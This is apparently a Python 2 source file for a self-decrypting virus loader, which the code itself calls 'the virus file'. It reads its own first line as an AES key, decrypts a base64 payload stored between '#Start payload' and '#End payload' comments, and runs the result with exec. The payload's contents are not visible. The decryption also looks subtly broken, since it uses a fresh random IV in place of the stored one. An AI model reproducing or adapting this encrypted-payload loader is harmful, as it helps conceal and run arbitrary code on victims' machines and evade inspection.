print "HELOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO"
######################################################## First script python
# coding=utf-8
# Start Uncrypted
import os                        
import __main__                                     
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES
from Crypto import Random

def encrypt(data):
   this = open(__main__.__file__, 'r')
   key = this.readline()
   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   encrypted = iv + cipher.encrypt(data)

   return base64.b64encode(encrypted)
 ####################

# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   key = this.readline()
   this.close()

   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '#Start payload':
      copy = True
   elif line.strip() == '#End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
print e
exec e
sys.exit('Good job!')
# End Uncrypted
#Start payload
#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
#End payload